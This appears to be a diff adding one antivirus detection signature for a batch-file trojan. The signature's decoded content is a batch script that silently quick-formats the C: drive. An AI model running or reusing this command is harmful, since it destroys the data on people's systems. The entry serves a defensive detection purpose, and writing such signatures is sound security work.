@@ -1,0 +1,6 @@
+VIRUS NAME: Win.Trojan.BAT-30
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+@Echo Off
+echo y|format/q c: /v:Erased
